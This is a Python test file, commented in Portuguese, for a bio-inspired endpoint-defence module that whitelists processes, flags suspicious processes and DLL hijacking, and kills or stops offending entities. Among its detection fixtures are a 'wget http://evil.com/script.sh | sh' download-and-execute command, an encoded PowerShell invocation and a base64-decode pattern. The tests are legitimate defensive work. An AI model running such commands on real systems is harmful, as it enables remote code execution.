"""
Testes de 100% Coverage para NK Cell Service - Bio-Inspired Tests

OBJETIVO: 65% → 100% Coverage via testes baseados em fisiologia de células NK
FOCO: Missing-self detection, DLL hijacking, process whitelist, elimination

Bio-Inspiration: NK cells kill targets lacking MHC-I (self-markers)
- ProcessWhitelist = MHC-I markers (self-identification)
- MissingSelfDetector = KIR (Killer Inhibitory Receptors) checking for self
- DLLHijackDetector = Detecting compromised cell components
- NKCellCore = Complete NK cell behavior (scan + eliminate)

Padrão Pagani Absoluto: 100% = 100%
"""

import pytest
import json
import tempfile
import os
from unittest.mock import patch, MagicMock
from datetime import datetime

from nk_cell_core import (
    ProcessWhitelist,
    MissingSelfDetector,
    DLLHijackDetector,
    NKCellCore,
    IS_WINDOWS,
    IS_LINUX,
)


# =====================================================================
# TEST PROCESSWHITELIST (MHC-I MARKERS)
# =====================================================================


class TestProcessWhitelistBioInspired:
    """Testa ProcessWhitelist - simula MHC-I markers (self-identification)."""

    def test_load_whitelist_file_not_found_loads_default(self):
        """Testa load quando arquivo não existe - usa default (lines 63-69)."""
        whitelist = ProcessWhitelist(whitelist_path="/nonexistent/path.json")
        result = whitelist.load_whitelist()

        assert result["status"] == "default_loaded"
        assert result["entries"] > 0
        # Default deve ter carregado nomes de processos do sistema
        assert len(whitelist.whitelisted_names) > 0

    def test_load_whitelist_exception_fallback_to_default(self):
        """Testa exception durante load - fallback para default (lines 93-96)."""
        # Cria arquivo JSON inválido
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False) as f:
            f.write("{invalid json content")
            temp_path = f.name

        try:
            whitelist = ProcessWhitelist(whitelist_path=temp_path)
            result = whitelist.load_whitelist()

            # Deve retornar error mas fallback para default
            assert result["status"] == "error"
            assert result["fallback"] == "default"
            assert len(whitelist.whitelisted_names) > 0  # Default carregado

        finally:
            os.unlink(temp_path)

    def test_load_default_whitelist_linux(self):
        """Testa _load_default_whitelist em Linux (lines 100-120)."""
        with patch("nk_cell_core.IS_LINUX", True):
            with patch("nk_cell_core.IS_WINDOWS", False):
                whitelist = ProcessWhitelist()
                whitelist._load_default_whitelist()

                # Deve ter paths Linux
                assert "/usr/bin/" in whitelist.whitelisted_paths
                assert "/usr/sbin/" in whitelist.whitelisted_paths

                # Deve ter nomes Linux
                assert "systemd" in whitelist.whitelisted_names
                assert "sshd" in whitelist.whitelisted_names

    def test_load_default_whitelist_windows(self):
        """Testa _load_default_whitelist em Windows (lines 121-137)."""
        with patch("nk_cell_core.IS_LINUX", False):
            with patch("nk_cell_core.IS_WINDOWS", True):
                whitelist = ProcessWhitelist()
                whitelist._load_default_whitelist()

                # Deve ter paths Windows
                assert "C:\\Windows\\System32\\" in whitelist.whitelisted_paths
                assert "C:\\Windows\\SysWOW64\\" in whitelist.whitelisted_paths

                # Deve ter nomes Windows
                assert "svchost.exe" in whitelist.whitelisted_names
                assert "lsass.exe" in whitelist.whitelisted_names

    def test_is_whitelisted_exact_path_match(self):
        """Testa is_whitelisted com exact path match (lines 159-160)."""
        whitelist = ProcessWhitelist()
        whitelist.whitelisted_paths = {"/usr/bin/python3"}

        result = whitelist.is_whitelisted("python", "/usr/bin/python3", None)

        assert result["whitelisted"] is True
        assert "exact_path_match" in result["reason"]

    def test_is_whitelisted_path_prefix_match(self):
        """Testa is_whitelisted com path prefix (lines 163-166)."""
        whitelist = ProcessWhitelist()
        whitelist.whitelisted_paths = {"/usr/bin/"}

        result = whitelist.is_whitelisted("python3", "/usr/bin/python3", None)

        assert result["whitelisted"] is True
        assert "path_prefix_match" in result["reason"]

    def test_is_whitelisted_name_match(self):
        """Testa is_whitelisted com name match (lines 169-170)."""
        whitelist = ProcessWhitelist()
        whitelist.whitelisted_names = {"sshd"}

        result = whitelist.is_whitelisted("sshd", "/some/path/sshd", None)

        assert result["whitelisted"] is True
        assert "name_match" in result["reason"]

    def test_is_whitelisted_confidence_levels(self):
        """Testa confidence levels (lines 172-178)."""
        whitelist = ProcessWhitelist()
        whitelist.whitelisted_names = {"test"}
        whitelist.whitelisted_paths = {"/usr/bin/"}

        # Name match: confidence 0.70
        result_name = whitelist.is_whitelisted("test", "/unknown/path", None)
        assert result_name["confidence"] == 0.70

        # Path match sem name: confidence 0.85
        result_path = whitelist.is_whitelisted("other", "/usr/bin/other", None)
        assert result_path["confidence"] == 0.85


# =====================================================================
# TEST MISSINGSELFDETECTOR (KIR - KILLER INHIBITORY RECEPTORS)
# =====================================================================


class TestMissingSelfDetectorBioInspired:
    """Testa MissingSelfDetector - simula KIR checking for MHC-I."""

    @pytest.mark.asyncio
    async def test_detect_missing_self_suspicious_parent_child(self):
        """Testa suspicious parent-child relationship (lines 230-232)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        # svchost.exe com parent cmd.exe é suspeito
        process_info = {
            "name": "svchost.exe",
            "path": "C:\\Windows\\System32\\svchost.exe",
            "parent_name": "cmd.exe",
            "signed": True,
            "cmdline": "",
        }

        result = await detector.detect_missing_self(process_info)

        assert "suspicious_parent_child_relationship" in result["indicators"]
        assert result["severity_score"] > 0

    @pytest.mark.asyncio
    async def test_detect_missing_self_obfuscated_name(self):
        """Testa obfuscated process name detection (lines 236-237, 293-303)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        # Nome aleatório tipo "x7g2k.exe"
        process_info = {
            "name": "x7g2k5.exe",
            "path": "C:\\Temp\\x7g2k5.exe",
            "parent_name": "explorer.exe",
            "signed": False,
            "cmdline": "",
        }

        result = await detector.detect_missing_self(process_info)

        assert "obfuscated_process_name" in result["indicators"]
        assert result["severity_score"] > 0

    @pytest.mark.asyncio
    async def test_detect_missing_self_suspicious_cmdline(self):
        """Testa suspicious command-line detection (lines 240-242, 305-320)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        # Cmdline com powershell -enc (encoded)
        process_info = {
            "name": "powershell.exe",
            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_name": "cmd.exe",
            "signed": True,
            "cmdline": "powershell.exe -enc SGVsbG8gV29ybGQ=",
        }

        result = await detector.detect_missing_self(process_info)

        assert "suspicious_cmdline_args" in result["indicators"]
        assert result["severity_score"] > 0

    def test_is_suspicious_parent_child_returns_true(self):
        """Testa _is_suspicious_parent_child logic (lines 287-289)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        # svchost.exe spawned by powershell.exe é suspeito
        result = detector._is_suspicious_parent_child("svchost.exe", "powershell.exe")
        assert result is True

    def test_is_obfuscated_name_random_chars(self):
        """Testa _is_obfuscated_name com chars aleatórios (lines 296-301)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        # Nome random tipo "abc123xyz.exe" (6-12 chars)
        assert detector._is_obfuscated_name("x7g2k5ab.exe") is True
        assert detector._is_obfuscated_name("RANDOM123ABC.exe") is True

        # Nome legítimo (fora do pattern - tem underscore ou muito curto/longo)
        assert detector._is_obfuscated_name("my_app.exe") is False
        assert detector._is_obfuscated_name("app") is False

    def test_has_suspicious_cmdline_patterns(self):
        """Testa _has_suspicious_cmdline patterns (lines 316-318)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        # Encoded PowerShell
        assert detector._has_suspicious_cmdline("powershell -enc abcd123") is True

        # Wget pipe to shell
        assert detector._has_suspicious_cmdline("wget http://evil.com/script.sh | sh") is True

        # Base64 decode
        assert detector._has_suspicious_cmdline("echo abcd | base64 -d") is True

        # Legítimo
        assert detector._has_suspicious_cmdline("python main.py --verbose") is False

    def test_calculate_risk_level_all_levels(self):
        """Testa _calculate_risk_level para todos níveis (lines 324-333)."""
        whitelist = ProcessWhitelist()
        detector = MissingSelfDetector(whitelist)

        assert detector._calculate_risk_level(0.9) == "CRITICAL"
        assert detector._calculate_risk_level(0.7) == "HIGH"
        assert detector._calculate_risk_level(0.5) == "MEDIUM"
        assert detector._calculate_risk_level(0.3) == "LOW"
        assert detector._calculate_risk_level(0.1) == "INFO"


# =====================================================================
# TEST DLLHIJACKDETECTOR (DETECTING COMPROMISED COMPONENTS)
# =====================================================================


class TestDLLHijackDetectorBioInspired:
    """Testa DLLHijackDetector - simula detecção de componentes comprometidos."""

    @pytest.mark.asyncio
    async def test_detect_dll_hijacking_unsigned_dll_in_signed_process(self):
        """Testa unsigned DLL em processo assinado (lines 378-382)."""
        detector = DLLHijackDetector()

        process_info = {"name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "signed": True}

        loaded_libraries = [{"path": "C:\\Temp\\malicious.dll", "name": "malicious.dll", "signed": False}]

        result = await detector.detect_dll_hijacking(process_info, loaded_libraries)

        assert result["hijacking_detected"] is True
        assert "unsigned_dll_in_signed_process" in result["indicators"]
        assert len(result["suspicious_dlls"]) > 0

    @pytest.mark.asyncio
    async def test_detect_dll_hijacking_dll_outside_expected_paths(self):
        """Testa DLL fora de paths esperados (lines 384-391)."""
        detector = DLLHijackDetector()

        # Process em Linux path
        process_info = {"name": "app", "path": "/opt/myapp/app", "signed": True}

        # DLL/SO em path suspeito (não system /lib, /usr/lib, não app dir /opt/myapp)
        loaded_libraries = [{"path": "/home/user/suspicious.so", "name": "suspicious.so", "signed": True}]

        result = await detector.detect_dll_hijacking(process_info, loaded_libraries)

        assert result["hijacking_detected"] is True
        assert "dll_outside_expected_paths" in result["indicators"]

    @pytest.mark.asyncio
    async def test_detect_dll_hijacking_known_hijackable_dll(self):
        """Testa known hijackable DLL (lines 393-397, 417-431)."""
        detector = DLLHijackDetector()

        process_info = {"name": "app.exe", "path": "C:\\MyApp\\app.exe", "signed": False}

        # dwmapi.dll é alvo conhecido de hijacking
        loaded_libraries = [{"path": "C:\\MyApp\\dwmapi.dll", "name": "dwmapi.dll", "signed": False}]

        result = await detector.detect_dll_hijacking(process_info, loaded_libraries)

        assert result["hijacking_detected"] is True
        assert "known_hijackable_dll" in result["indicators"]

    @pytest.mark.asyncio
    async def test_detect_dll_hijacking_dll_in_temp_directory(self):
        """Testa DLL em diretório temporário (lines 399-403)."""
        detector = DLLHijackDetector()

        process_info = {"name": "process.exe", "path": "C:\\App\\process.exe", "signed": False}

        # DLL em /tmp/ (suspeito)
        loaded_libraries = [{"path": "/tmp/evil.so", "name": "evil.so", "signed": False}]

        result = await detector.detect_dll_hijacking(process_info, loaded_libraries)

        assert result["hijacking_detected"] is True
        assert "dll_in_temp_directory" in result["indicators"]

    def test_is_hijackable_dll_returns_true(self):
        """Testa _is_hijackable_dll logic (lines 420-431)."""
        detector = DLLHijackDetector()

        # DLLs conhecidos como alvos
        assert detector._is_hijackable_dll("dwmapi.dll") is True
        assert detector._is_hijackable_dll("DWMAPI.DLL") is True  # Case insensitive
        assert detector._is_hijackable_dll("uxtheme.dll") is True
        assert detector._is_hijackable_dll("version.dll") is True

        # DLL não conhecido
        assert detector._is_hijackable_dll("random.dll") is False


# =====================================================================
# TEST NKCELLCORE (FULL NK CELL BEHAVIOR)
# =====================================================================


class TestNKCellCoreBioInspired:
    """Testa NKCellCore - comportamento completo de célula NK."""

    @pytest.mark.asyncio
    async def test_scan_process_with_dll_hijacking(self):
        """Testa scan com DLL hijacking detection (lines 485-498)."""
        nk_cell = NKCellCore(dry_run=True)

        process_info = {"pid": "1234", "name": "app.exe", "path": "C:\\App\\app.exe", "signed": True}

        loaded_libraries = [{"path": "C:\\Temp\\evil.dll", "name": "evil.dll", "signed": False}]

        result = await nk_cell.scan_process(process_info, loaded_libraries)

        # Deve detectar threat via DLL hijacking
        assert result["threat_detected"] is True
        assert result["dll_hijacking"] is not None
        assert result["dll_hijacking"]["hijacking_detected"] is True

    @pytest.mark.asyncio
    async def test_eliminate_entity_dry_run_mode(self):
        """Testa eliminate em dry-run mode (lines 536-548)."""
        nk_cell = NKCellCore(dry_run=True)

        result = await nk_cell.eliminate_entity(
            entity_id="1234", entity_type="process", reason="missing_self", severity=0.8
        )

        assert result["dry_run"] is True
        assert result["status"] == "simulated"
        assert "DRY-RUN" in result["message"]

    @pytest.mark.asyncio
    async def test_eliminate_entity_production_process_kill(self):
        """Testa eliminate production mode - process kill (lines 550-570, 598-606)."""
        nk_cell = NKCellCore(dry_run=False)

        # Mock os.kill para não matar processo real
        with patch("os.kill") as mock_kill:
            mock_kill.return_value = None

            result = await nk_cell.eliminate_entity(
                entity_id="9999", entity_type="process", reason="dll_hijacking", severity=0.9
            )

            assert result["dry_run"] is False
            assert result["entity_type"] == "process"
            mock_kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_eliminate_entity_production_container_stop(self):
        """Testa eliminate production mode - container stop (lines 554-558, 617-629)."""
        nk_cell = NKCellCore(dry_run=False)

        # Mock subprocess.run
        mock_result = MagicMock()
        mock_result.returncode = 0

        with patch("subprocess.run", return_value=mock_result) as mock_subprocess:
            result = await nk_cell.eliminate_entity(
                entity_id="container123", entity_type="container", reason="compromised", severity=0.85
            )

            assert result["dry_run"] is False
            assert result["entity_type"] == "container"
            mock_subprocess.assert_called_once()
            assert "docker" in str(mock_subprocess.call_args)

    @pytest.mark.asyncio
    async def test_eliminate_entity_unknown_entity_type(self):
        """Testa eliminate com entity_type desconhecido (lines 556-558)."""
        nk_cell = NKCellCore(dry_run=False)

        result = await nk_cell.eliminate_entity(
            entity_id="unknown123", entity_type="unknown_type", reason="test", severity=0.5
        )

        # Deve retornar failed para tipo desconhecido
        assert result["status"] == "failed"

    @pytest.mark.asyncio
    async def test_eliminate_entity_production_exception(self):
        """Testa eliminate exception handling (lines 572-584)."""
        nk_cell = NKCellCore(dry_run=False)

        # Mock _kill_process para lançar exception (não os.kill diretamente)
        with patch.object(nk_cell, "_kill_process", side_effect=PermissionError("Access denied")):
            result = await nk_cell.eliminate_entity(
                entity_id="1234", entity_type="process", reason="test", severity=0.7
            )

            assert result["status"] == "error"
            assert "Access denied" in result["message"]

    @pytest.mark.asyncio
    async def test_kill_process_exception(self):
        """Testa _kill_process exception handling (lines 604-606)."""
        nk_cell = NKCellCore(dry_run=False)

        # Mock os.kill para lançar exception
        with patch("os.kill", side_effect=ProcessLookupError("No such process")):
            result = await nk_cell._kill_process("99999")

            assert result is False

    @pytest.mark.asyncio
    async def test_stop_container_failure(self):
        """Testa _stop_container failure (lines 624-626)."""
        nk_cell = NKCellCore(dry_run=False)

        # Mock subprocess.run com returncode != 0
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = b"Container not found"

        with patch("subprocess.run", return_value=mock_result):
            result = await nk_cell._stop_container("nonexistent")

            assert result is False

    @pytest.mark.asyncio
    async def test_stop_container_exception(self):
        """Testa _stop_container exception handling (lines 627-629)."""
        nk_cell = NKCellCore(dry_run=False)

        # Mock subprocess.run para lançar timeout
        with patch("subprocess.run", side_effect=TimeoutError("Docker timeout")):
            result = await nk_cell._stop_container("timeout_container")

            assert result is False


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
